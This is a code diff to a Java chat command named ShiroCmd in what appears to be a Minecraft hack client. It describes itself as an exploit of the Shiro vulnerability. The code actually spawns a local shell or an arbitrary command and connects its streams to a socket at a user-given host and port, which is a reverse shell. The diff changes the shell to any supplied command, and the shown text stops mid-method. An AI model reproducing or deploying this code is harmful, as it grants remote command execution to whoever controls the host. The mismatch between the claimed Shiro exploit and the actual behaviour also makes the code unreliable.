@@ -12,7 +12,7 @@ import net.wurstclient.forge.utils.ChatUtils;
 
 public final class ShiroCmd extends Command {
     public ShiroCmd() {
-        super("shiro", "试图使用Shiro漏洞注入服务器.", "语法: .shiro <靶机IP> <靶机系统(win|linux)> <端口> <命令>");
+        super("shiro", "试图使用Shiro漏洞注入服务器.", "语法: .shiro <靶机IP> <端口> <命令>");
     }
 
     @Override
@@ -24,20 +24,14 @@ public final class ShiroCmd extends Command {
         } else {
             try {
                 String host = args[1];
-                int port = 25565;
-                String cmd = "";
+                int port = 80;
+                String cmd = args[3];
                 try {
                     port = Integer.parseInt(args[2]);
                 } catch (NumberFormatException e) {
                     throw new CmdSyntaxError("端口必须为一个>1且<65536的数字.");
                 }
-                if (args[1].equals("win")) {
-                    cmd = "cmd.exe";
-                } else if (args[1].equals("linux")) {
-                    cmd = "/bin/bash";
-                } else {
-                    throw new CmdSyntaxError("系统只能是 'win' 或 'linux'.");
-                }
+
                 Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                 java.net.Socket s = new java.net.Socket(host, port);
                 java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
